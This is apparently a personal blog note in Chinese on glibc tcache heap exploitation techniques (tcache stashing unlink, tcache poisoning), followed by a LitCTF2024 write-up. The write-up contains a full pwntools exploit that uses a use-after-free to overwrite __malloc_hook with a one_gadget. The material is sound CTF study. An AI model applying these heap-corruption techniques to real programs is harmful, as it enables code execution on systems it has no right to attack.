---
title: Tcache Attack
date: '2025-02-19 13:31:57'
updated: '2025-05-28 19:22:55'
---
2.27比2.23多了tcache

开始申请堆的时候出现的0x250的堆块，是tcachebin的管理堆块。tcache要求快

在2.31后大小是0x290

2.27的tcache对double free没有检查，仅限于非最新版本

tcache最大的堆块0x4f0   想要不进tcache，至少要申请0x500 大小的 chunk

## Tcache stashing unlink attack
主要利用的是 calloc 函数会绕过 tcachebin 从smallbin 里取出 chunk 的特性

当我们从small bin拿出来chunk的时候，程序会检查当前small bin链上是否还有剩余堆块，如果有的话并且tcache bin的链上还有空余位置(前提是不能为空，不然即使有空余也不行），就会把剩下的堆块链进tcachebin里面，但是链进去的时候没有进行链表的检查，所以我们可以在这个时候攻击这个即将链进tcachebin的堆块的bk指针，就可以达到任意地址写一个main_arena 地址的效果

<font style="background-color:#FBDE28;">smallbin 和 largebin 的 bin 中同一 size 区间的 chunk 都是 FIFO 机制，即从 bk 进入，从 fd 取出</font>

1. 假设目前tcache bin中已经有五个堆块，并且相应大小的small bin中已经有两个堆块，由bk指针连接为：chunk_A<-chunk_B
2. 利用漏洞修改chunk_A的bk为fake chunk，并且修改fake chunk的bk为target_addr - 0x10
3. 通过calloc()越过tcache bin，直接从small bin中取出chunk_B返回给用户，并且会将chunk_A以及其所指向的fake chunk放入tcache bin（这里只会检测chunk_A的fd指针是否指向了chunk_B）

```python
while ( tcache->counts[tc_idx] < mp_.tcache_count
    && (tc_victim = last (bin) ) != bin) //验证取出的Chunk是否为Bin本身（Smallbin是否已空）
{
 if (tc_victim != 0) //成功获取了chunk
 {
     bck = tc_victim->bk; //在这里bck是fake chunk的bk
     //设置标志位
     set_inuse_bit_at_offset (tc_victim, nb);
     if (av != &main_arena)
         set_non_main_arena (tc_victim);
 
     bin->bk = bck;
     bck->fd = bin; //关键处
 
     tcache_put (tc_victim, tc_idx); //将其放入到tcache中
 }
}
```

4. 在fake chunk放入tcache bin之前，执行了bck->fd = bin;的操作（这里的bck就是fake chunk的bk，也就是target_addr - 0x10），故target_addr - 0x10的fd，也就target_addr地址会被写入一个与libc相关大数值（可利用）
5. 再申请一次，就可以从tcache中获得fake chunk的控制权

综上，此利用可以完成获得任意地址的控制权和在任意地址写入大数值两个任务，这两个任务当然也可以拆解分别完成：

1. 获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）
2. 在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可

> 来自：https://bailan2.github.io/2024/08/20/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-tcache%20stashing%20unlink%20attack/#tcache-stashing-unlink-attack
>

### 小结
Tcache stashing unlink attack 可以实现将一个 fakechunk 放进 tcachebin 从而实现任意地址申请，并且同时实现将一个 libc 地址填进任意地址，也可以两个单独作用单独使用：

单独要任意地址伪造 chunk：tcachebin 没满，在 smallbin 当中，calloc 申请的 chunk 之外剩下的 chunk 数量小于 tcachebin 的空位而且最后的 chunk 的 bk 可以篡改（其实就是 fakechunk 得有空位进 tcachebin，还有 fakechunk 的 fd 位置得可写）

单独要任意地址写入 libc 地址：tcachebin 中 6 个 chunk（差一个满），然后将 smallbin 最后的 chunk 的bk改为target_addr - 0x10即可（会往target_addr - 0x10 这个 fakechunk 的 fd 写入 libc 地址，也就是向 target_addr 写入 libc 地址）

### Tcache stash 
libc-2.29开始，出现了一种叫 stash 的机制，基本原理就是当调用 _int_malloc 时，如果从 smallbin 或者 fastbin 中取出 chunk 之后，对应大小的 tcache 没有满，就会把剩下的 chunk 放入 tcache 中

## Tcache poisoning
效果：实现任意地址写

释放堆块 b->a

修改b的指针指向想要分配堆块的地址相比与之前版本可以让 count 为负值，构造链表尾部的堆块

2.31需要在前一个堆块开始构造，绕过 count 的限制

### Tcache count
在 2.31 的 tcachebin 会检查 bin 里面 chunk 的数量，不能小于 0

## Tcache bins 和 Fast bins 的区别
tcache bins 是在 libc2.26 版本之后加进来的机制

| 特性 | Fastbins | Tcachebins |
| --- | --- | --- |
| 主要目标 | 提高小块内存分配和释放的速度 | 提高小块内存分配和释放的速度，特别是在多线程环境中 |
| 管理方式 | 使用单链表管理 | 使用单链表管理，每个线程有自己的缓存 |
| 内存块大小 | 主要管理小于等于 64 字节的块 | 管理多个大小的内存块，每个线程有自己的缓存 |
| 性能优化 | 避免访问全局空闲列表，减少锁竞争 | 进一步减少锁竞争，优化多线程性能 |
| 线程安全性 | 使用全局锁进行同步 | 每个线程有自己的缓存，减少全局锁使用 |


## LitCTF2024 heap 2.27 （第一道堆题）
![](/images/76a749e3ab8574347c99e1492412de8f.png)

安全措施全开了...害怕...

UAF（use-after-free)漏洞，看了看大概是利用 free 之后没有将指针置零可以再次利用，并且利用分配机制来重新申请到同一块内存来改写

看资料应该是跟 tcache 有关系，

找了一整天，连原题 WP 都找到了，但是看不懂，[找到的WP](https://xz.aliyun.com/news/14252)听 clby 师傅说写得太简洁



利用 unsortedchunk 泄露 libc 地址，算出 malloc_hook 的地址

利用 UAF 覆盖 tcache 中的 next（相当于 fd）为 malloc_hook，再申请出来这片内存修改 malloc_hook 为 one_gadget

旧版本 2.27 的 tcache 不需要伪造任何 chunk 结构即可实现 malloc 到任何地址

自己写的 exp：

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
link=process("./heap")
libc=ELF('./glibc/libc-2.27.so')

def gdb_attach():
	gdb.attach(link)
	pause()

def create(idx,size):
	link.recvuntil(b'>>')
	link.sendline(b'1')
	link.recvuntil(b"?")
	link.sendline(str(idx))
	link.recvuntil(b"?")
	link.sendline(str(size))

def delete(idx):
	link.recvuntil(b'>>')
	link.sendline(b'2')
	link.recvuntil(b"?")
	link.sendline(str(idx))

def show(idx):
	link.recvuntil(b'>>')
	link.sendline(b'3')
	link.recvuntil(b"?")
	link.sendline(str(idx))

def edit(idx,content):
	link.recvuntil(b'>>')
	link.sendline(b'4')
	link.recvuntil(b"?")
	link.sendline(str(idx))
	link.recvuntil(b":")
	link.send(content)

ogg=[0x4f2be,0x4f2c5,0x4f322,0x10a38c]

create(1,1280) #unsorted
create(2,30) #tcache
delete(1) #unsorted
show(1) #unsorted
malloc_hook=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x70
print(hex(malloc_hook))
libc_base=malloc_hook-libc.sym[b'__malloc_hook']
print(hex(libc_base))
delete(2)
edit(2,p64(malloc_hook))
create(3,30)
create(4,30) #malloc_hook
edit(4,p64(libc_base+ogg[3]))
create(5,30)
# gdb_attach()


link.interactive()
```

要注意的一个点：

+ 最后发送内容的时候得用 `send` 而且不用 `str()`函数

```python
def edit(idx,content):
	link.recvuntil(b'>>')
	link.sendline(b'4')
	link.recvuntil(b"?")
	link.sendline(str(idx))
	link.recvuntil(b":")
	link.send(content)
```

